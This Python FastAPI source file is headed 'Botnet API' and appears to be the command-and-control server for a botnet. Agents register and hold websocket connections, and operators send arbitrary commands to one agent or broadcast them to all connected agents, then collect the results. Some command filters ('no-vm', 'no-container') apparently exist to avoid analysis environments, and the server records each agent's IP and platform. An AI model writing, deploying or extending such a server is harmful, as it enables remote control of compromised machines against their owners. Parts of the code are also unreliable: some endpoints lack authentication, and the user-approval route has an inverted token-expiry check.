import fastapi
from fastapi.middleware.cors import CORSMiddleware
from fastapi import responses, WebSocket, Request, Header
from starlette.websockets import WebSocketState
import uvicorn
from uuid import uuid4
import secrets
from passlib.context import CryptContext
import time
from pydantic import BaseModel
import asyncio
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from typing import Annotated
from json.decoder import JSONDecodeError

from config import Config
from database import Database
from database import Schemas


class UpdateAgent(BaseModel):
    name: str = None
    description: str = None
    version: int = None


allLimitations = ['win32', 'darwin', 'linux', 'linux2', 'no-vm', 'no-container']


class AgentCommand(BaseModel):
    command: str
    limitations: list[str] = None

class MultiAgentCommand(BaseModel):
    command: str
    limitations: list[str] = None
    uuids: list[str] = None


class User(BaseModel):
    username: str
    password: str

class UUIDAndToken(BaseModel):
    uuid: str
    token: str


class Connection:
    def __init__(self, websocket: WebSocket, uuid: str, platform: str = None, architecture: str = None, vm: bool = None, version: int = None):
        self.websocket = websocket
        self.uuid = uuid
        self._rec_buffer = asyncio.Queue()
        self.platform = platform
        self.architecture = architecture
        self.vm = vm
        self.version = version

    async def send_json(self, message: dict):
        await self.websocket.send_json(message)

    async def receive_json(self):
        return await self._rec_buffer.get()


class ConnectionManager:
    def __init__(self):
        self.active_connections: list[Connection] = []

    def get_connection(self, uuid: str):
        for conn in self.active_connections:
            if conn.uuid == uuid:
                return conn
            
        return None

    async def connect(self, websocket: WebSocket, uuid: str):
        for conn in self.active_connections:
            if conn.uuid == uuid:
                await websocket.close(code=1000, reason="Already connected.")
                return

        await websocket.accept()
        self.active_connections.append(Connection(websocket, uuid))

        await websocket.send_json({"status": "200"})

    def disconnect(self, websocket_or_uuid: WebSocket | str):
        for connection in self.active_connections:
            if isinstance(websocket_or_uuid, WebSocket):
                if connection.websocket == websocket_or_uuid:
                    self.active_connections.remove(connection)
                    return
            else:
                if connection.uuid == websocket_or_uuid:
                    self.active_connections.remove(connection)
                    return

    async def send_personal_message(self, message: dict, websocket_or_uuid: WebSocket | str):
        for connection in self.active_connections:
            if isinstance(websocket_or_uuid, WebSocket):
                if connection.websocket == websocket_or_uuid:
                    await connection.websocket.send_json(message)
                    return
            else:
                if connection.uuid == websocket_or_uuid:
                    await connection.websocket.send_json(message)
                    return

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            await connection.websocket.send_json(message)

manager = ConnectionManager()

config: Config = Config()

db: Database = Database(config.dbstring)

STOP = False

async def connection_cleanup(app: fastapi.FastAPI):
    while not STOP:
        for connection in manager.active_connections:
            if connection.websocket.client_state == WebSocketState.DISCONNECTED:
                manager.disconnect(connection)
            if connection.websocket.client is None:
                manager.disconnect(connection)


        await asyncio.sleep(10)

async def lifespan(app: fastapi.FastAPI):
    asyncio.create_task(connection_cleanup(app))
    yield
    stop = True

app = fastapi.FastAPI(title="Botnet API", lifespan=lifespan)

origins = [
    "*"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

limiter = Limiter(key_func=get_remote_address)

app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# TODO: make this a post request
@app.get("/agent/register")
@limiter.limit("5/hour")
async def register_agent(request: Request, version: int, name: str = None, description: str = None):
    """
    Register an agent with the server.
    :param name: The name of the agent.
    :param description: A description of the agent.
    :param version: The version of the agent.
    :return: The agent's UUID.
    """

    secret = secrets.token_urlsafe(32)

    secret_hashed = pwd_context.hash(secret)

    agent = Schemas.AgentSchema(
        uuid=str(uuid4()),
        secret=secret_hashed,
        name=name,
        description=description,
        version=version,
        created_at=int(time.time()),
        last_seen=int(time.time())
    )

    await db.agents.insert_one(agent.to_dict())

    response = agent.to_dict()
    response['raw_secret'] = secret

    return responses.JSONResponse(response, status_code=200)

# TODO: this requires authentication as either the agent or a user
@app.get("/agent/{uuid}")
async def get_agent(request: Request, uuid: str):
    """
    Get an agent's information.
    :param uuid: The agent's UUID.
    :return: The agent's information.
    """

    agent: Schemas.AgentSchema = await db.agents.find_one(Schemas.AgentSchema(uuid=uuid))

    if agent is None:
        return responses.JSONResponse({"error": "Agent not found."}, status_code=404)

    agent.secret = None
    agent = agent.to_dict()

    conn = manager.get_connection(uuid)

    if conn is not None:
        agent["ip"] = conn.websocket.client.host
        agent["platform"] = conn.platform
        agent["architecture"] = conn.architecture
        agent["vm"] = conn.vm
        agent["version"] = conn.version
        agent["connected"] = True
    else:
        agent["connected"] = False

    return responses.JSONResponse(agent, status_code=200)

# TODO: this requires authentication as a user
@app.get("/agents/{page}")
async def get_agents(request: Request, authorization: Annotated[str | None, Header()], page: int, limit: int = 10):
    """
    Get a page of agents.
    :param page: The page number.
    :param limit: The number of agents per page.
    :return: The agents.
    """

    if authorization is None:
        return responses.JSONResponse({"error": "No token provided."}, status_code=401)
    
    try:
        authorization = authorization.replace("Bearer ", "")
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    
    try:
        if not pwd_context.verify(authorization, user.auth_token):
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)

    if page < 0:
        return responses.JSONResponse({"error": "Invalid page number."}, status_code=401)
    if limit < 0:
        return responses.JSONResponse({"error": "Invalid limit."}, status_code=401)
    if limit > 100:
        return responses.JSONResponse({"error": "Limit too high."}, status_code=401)

    agents = (await db.agents.find({})).skip(page * limit).limit(limit)

    agents = await agents.to_list(length=limit)

    for agent in agents:
        agent.pop("secret")
        agent.pop("_id")

        conn = manager.get_connection(agent.get("uuid"))

        if conn is not None and conn.websocket.client_state == WebSocketState.CONNECTED and conn.websocket.client is not None:
            agent["ip"] = conn.websocket.client.host
            agent["platform"] = conn.platform
            agent["architecture"] = conn.architecture
            agent["vm"] = conn.vm
            agent["connected"] = True
        else:
            agent["connected"] = False

    res = {
        "agents": agents,
        "page": page,
        "limit": limit,
        "total_agents": await db.agents.count_documents({}),
        "total_pages": await db.agents.count_documents({}) // limit
    }

    return responses.JSONResponse(res, status_code=200)

@app.post("/agents/command")
async def send_command_to_agents(request: Request, authorization: Annotated[str | None, Header()], command: MultiAgentCommand):
    """
    Send a command to multiple agents.
    :param command: The command to send.
    :return: The agent's information.
    """

    if authorization is None:
        return responses.JSONResponse({"error": "No token provided."}, status_code=401)
    
    try:
        authorization = authorization.replace("Bearer ", "")
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    
    try:
        if not pwd_context.verify(authorization, user.auth_token):
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)

    if command.limitations is not None:
        for limitation in command.limitations:
            if limitation not in allLimitations:
                return responses.JSONResponse({"error": "Invalid limitation."}, status_code=401)
            
    errors = []
    agent_responses = {}

    if command.uuids is None:
        command.uuids = []

        for conn in manager.active_connections:
            command.uuids.append(conn.uuid)

    for uuid in command.uuids:
        agent: Schemas.AgentSchema = await db.agents.find_one(Schemas.AgentSchema(uuid=uuid))

        if agent is None:
            errors.append({"uuid": uuid, "error": "Agent not found."})
            continue

        await manager.send_personal_message({"command": command.command, "limitations": command.limitations}, uuid)

        conn = manager.get_connection(uuid)

        try:
            res = await conn.receive_json()
            agent_responses[uuid] = res
        except fastapi.WebSocketDisconnect as e:
            errors.append({"uuid": uuid, "error": "Agent not connected."})
            continue

    if len(errors) > 0:
        if len(agent_responses) > 0:
            return responses.JSONResponse({"errors": errors, "responses": agent_responses}, status_code=207)
        else:
            return responses.JSONResponse({"errors": errors}, status_code=500)

    return responses.JSONResponse({"status": "200"}, status_code=200)

# TODO: this requires authentication as either the agent or a user
@app.post("/agent/{uuid}/update")
async def update_agent(request: Request, authorization: Annotated[str | None, Header()], uuid: str, update: UpdateAgent):
    """
    Update an agent's information.
    :param uuid: The agent's UUID.
    :param update: The update information.
    :return: The agent's information.
    """

    if authorization is None:
        return responses.JSONResponse({"error": "No token provided."}, status_code=401)
    
    try:
        authorization = authorization.replace("Bearer ", "")
        auth_uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    # Check if uuid is a user or agent

    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=auth_uuid))

    if user is not None:
        try:
            if not pwd_context.verify(authorization, user.auth_token):
                return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
        except:
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
        
        if user.auth_timeout < time.time():
            return responses.JSONResponse({"error": "Token has expired."}, status_code=401)
        
        if not user.is_allowed:
            return responses.JSONResponse({"error": "User not allowed."}, status_code=401)
        
    agent: Schemas.AgentSchema = await db.agents.find_one(Schemas.AgentSchema(uuid=auth_uuid))

    if agent is not None:
        try:
            if not pwd_context.verify(authorization, agent.secret):
                return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
        except:
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
        
    if agent is None and user is None:
        return responses.JSONResponse({"error": "User or agent not found."}, status_code=404)

    agent: Schemas.AgentSchema = await db.agents.find_one(Schemas.AgentSchema(uuid=uuid))

    diff = {"$set": {}}

    if update.name is not None:
        diff["$set"]["name"] = update.name
        agent.name = update.name

    if update.description is not None:
        diff["$set"]["description"] = update.description
        agent.description = update.description

    if update.version is not None:
        diff["$set"]["version"] = update.version
        agent.version = update.version

    #await db.agents.update_one(Schemas.AgentSchema(uuid=uuid).to_dict(), diff)

    await db._database.agents.update_one(Schemas.AgentSchema(uuid=uuid).to_dict(), diff)

    return responses.JSONResponse(agent.to_dict(), status_code=200)

# TODO: this requires authentication as a user
@app.post("/agent/{uuid}/command")
async def send_command(request: Request, authorization: Annotated[str | None, Header()], uuid: str, command: AgentCommand):
    """
    Send a command to an agent.
    :param uuid: The agent's UUID.
    :param command: The command to send.
    :return: The agent's information.
    """

    if authorization is None:
        return responses.JSONResponse({"error": "No token provided."}, status_code=401)
    
    try:
        authorization = authorization.replace("Bearer ", "")
        auth_uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=auth_uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    
    try:
        if not pwd_context.verify(authorization, user.auth_token):
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)

    await manager.send_personal_message({"command": command.command, "limitations": command.limitations}, uuid)

    conn = manager.get_connection(uuid)

    try:
        res = await conn.receive_json()
    except fastapi.WebSocketDisconnect as e:
        return responses.JSONResponse({"error": "Agent not connected."}, status_code=401)

    return responses.JSONResponse(res, status_code=200)


@app.websocket("/agent/{uuid}/ws")
async def agent_ws(websocket: fastapi.WebSocket, uuid: str):
    """
    Handle an agent's websocket connection.
    :param websocket: The websocket connection.
    :param uuid: The agent's UUID.

    :return: None
    """

    await manager.connect(websocket, uuid)

    # Authenticate the agent
    data = await websocket.receive_json()
    if data is None:
        await websocket.close(code=1000, reason="No data provided.")
        manager.disconnect(websocket)
        return

    if data.get("secret") is None:
        await websocket.close(code=1000, reason="No secret provided.")
        manager.disconnect(websocket)
        return

    agent = await db.agents.find_one(Schemas.AgentSchema(uuid=uuid))
    if agent is None:
        await websocket.close(code=1000, reason="Agent not found.")
        manager.disconnect(websocket)
        return

    if not pwd_context.verify(data.get("secret"), agent.secret):
        await websocket.close(code=1000, reason="Invalid secret.")
        await manager.disconnect(websocket)
        return
    
    conn = manager.get_connection(uuid)

    conn.platform = data.get("platform")
    conn.architecture = data.get("architecture")
    conn.vm = data.get("vm")
    conn.version = data.get("version")

    try:
        while True:
            data = await websocket.receive_json()
            await conn._rec_buffer.put(data)
            await db.agents.update_one(Schemas.AgentSchema(uuid=uuid), {"$set": {"last_seen": int(time.time())}})
    except fastapi.WebSocketDisconnect:
        manager.disconnect(websocket)
        return
    except JSONDecodeError:
        pass


@app.get("/user/{uuid}")
async def get_user(request: Request, authorization: Annotated[str | None, Header()], uuid: str):
    """
    Get a user's information.
    :param uuid: The user's UUID.
    :return: The user's information.
    """

    authorization = authorization.replace("Bearer ", "")

    try:
        auth_uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)

    auth_user = await db.users.find_one(Schemas.UserSchema(uuid=auth_uuid))

    if auth_user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    
    if authorization is None:
        return responses.JSONResponse({"error": "No token provided."}, status_code=401)
    
    try:
        if not pwd_context.verify(authorization, auth_user.auth_token):
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    if auth_user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)
    
    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    return responses.JSONResponse(user.to_dict(), status_code=200)


@app.post("/user/register")
@limiter.limit("5/hour")
async def register_user(request: Request, user: User):
    """
    Register a user with the server.
    :param username: The user's username.
    :param password: The user's password.
    :return: The user's UUID.
    """

    user = Schemas.UserSchema(
        uuid=str(uuid4()),
        username=user.username,
        password=pwd_context.hash(user.password),
        created_at=int(time.time()),
        is_allowed=False
    )

    await db.users.insert_one(user.to_dict())

    return responses.JSONResponse(user.to_dict(), status_code=200)


@app.post("/user/login")
async def login_user(request: Request, user: User):
    """
    Login a user.
    :param username: The user's username.
    :param password: The user's password.
    :return: Object containing access token
    """

    dbuser: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(username=user.username))

    if dbuser is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)

    if not pwd_context.verify(user.password, dbuser.password):
        return responses.JSONResponse({"error": "Invalid password."}, status_code=401)

    if not dbuser.is_allowed:
        return responses.JSONResponse({"error": "User not allowed."}, status_code=401)

    diff = {"$set": {"auth_token": "", "auth_timeout": 0}}

    auth_token = secrets.token_urlsafe(32)
    dbuser.auth_token = auth_token

    auth_token_hashed = pwd_context.hash(auth_token)
    diff["$set"]["auth_token"] = auth_token_hashed

    auth_token_timeout = int(time.time()) + 5260000  # 2 months
    dbuser.auth_timeout = auth_token_timeout
    diff["$set"]["auth_timeout"] = auth_token_timeout

    dbuser.auth_token = f"{dbuser.uuid}::{auth_token}"

    await db.users.update_one(Schemas.UserSchema(username=user.username), diff)

    return responses.JSONResponse(dbuser.to_dict(), status_code=200)

@app.post('/user/verify')
async def verify_token(request: Request, authorization: Annotated[str | None, Header()]):
    authorization = authorization.replace("Bearer ", "")

    try:
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    
    try:
        if not pwd_context.verify(authorization, user.auth_token):
            return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)
    
    return responses.JSONResponse(user.to_dict(), status_code=200)
    
@app.post('/user/renew')
async def renew_token(request: Request, authorization: Annotated[str | None, Header()]):
    authorization = authorization.replace("Bearer ", "")

    try:
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)

    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    if not pwd_context.verify(authorization, user.auth_token):
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)
    
    diff = {"$set": {"auth_token": "", "auth_timeout": 0}}

    auth_token = secrets.token_urlsafe(32)
    user.auth_token = auth_token

    auth_token_hashed = pwd_context.hash(auth_token)
    diff["$set"]["auth_token"] = auth_token_hashed

    auth_token_timeout = int(time.time()) + 5260000  # 2 months
    user.auth_timeout = auth_token_timeout
    diff["$set"]["auth_timeout"] = auth_token_timeout

    user.auth_token = f"{user.uuid}::{auth_token}"

    await db.users.update_one(Schemas.UserSchema(uuid=uuid), diff)

    return responses.JSONResponse(user.to_dict(), status_code=200)

@app.post("/user/invalidate_token")
async def invalidate_token(request: Request, authorization: Annotated[str | None, Header()]):
    authorization = authorization.replace("Bearer ", "")

    try:
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)

    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    if not pwd_context.verify(authorization, user.auth_token):
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    if user.auth_timeout < time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)

    diff = {"$set": {"auth_token": "", "auth_timeout": 0}}

    await db.users.update_one(Schemas.UserSchema(uuid=uuid), diff)

    return responses.JSONResponse(user.to_dict(), status_code=200)


@app.post("/user/{uuid}/allow")
async def authorize_user(request: Request, uuid: str, authorization: Annotated[str | None, Header()]):
    authorization = authorization.replace("Bearer ", "")

    try:
        uuid, authorization = authorization.split("::")
    except:
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)

    user: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if user is None:
        return responses.JSONResponse({"error": "User not found."}, status_code=404)
    if not pwd_context.verify(authorization, user.auth_token):
        return responses.JSONResponse({"error": "Invalid token."}, status_code=401)
    if user.auth_timeout > time.time():
        return responses.JSONResponse({"error": "Token has expired."}, status_code=401)
    
    if not user.is_allowed:
        return responses.JSONResponse({"error": "User not allowed."}, status_code=401)

    target: Schemas.UserSchema = await db.users.find_one(Schemas.UserSchema(uuid=uuid))

    if target is None:
        return responses.JSONResponse({"error": "Target not found."}, status_code=404)

    await db.users.update_one(Schemas.UserSchema(uuid=uuid), {"$set": {"is_allowed": True}})

    return responses.JSONResponse(user.to_dict(), status_code=200)


def main():
    import argparse
    import os

    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--host", type=str, default="0.0.0.0")
    args = parser.parse_args()

    if args.port == 8000:
        if os.environ.get("API_PORT"):
            if os.environ.get("API_PORT").isnumeric():
                args.port = int(os.environ.get("API_PORT"))

    if args.host == "0.0.0.0":
        if os.environ.get("API_HOST"):
            args.host = os.environ.get("API_HOST")

    uvicorn.run(app, host=args.host, port=args.port)

    stop = True


if __name__ == "__main__":
    main()
